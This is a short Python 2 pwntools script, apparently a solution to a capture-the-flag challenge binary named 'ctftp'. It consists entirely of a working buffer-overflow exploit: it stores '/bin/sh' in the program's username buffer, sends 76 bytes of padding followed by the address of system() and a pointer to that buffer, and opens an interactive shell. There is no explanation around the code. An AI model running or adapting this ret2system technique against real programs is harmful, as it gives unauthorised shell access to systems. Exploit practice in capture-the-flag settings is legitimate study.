from pwn import *

e = ELF('./ctftp')
p = process('./ctftp')

system_addr = e.symbols['system']
username_addr = e.symbols['username']
print hex(username_addr)

payload = 'A'*76
payload += p32(system_addr)
payload += 'AAAA'
payload += p32(username_addr)

print p.recvuntil(': ')
p.sendline('/bin/sh\x00')
p.sendline('2')
print p.recvuntil(': ')
p.sendline(payload)
p.interactive()
print p.recv()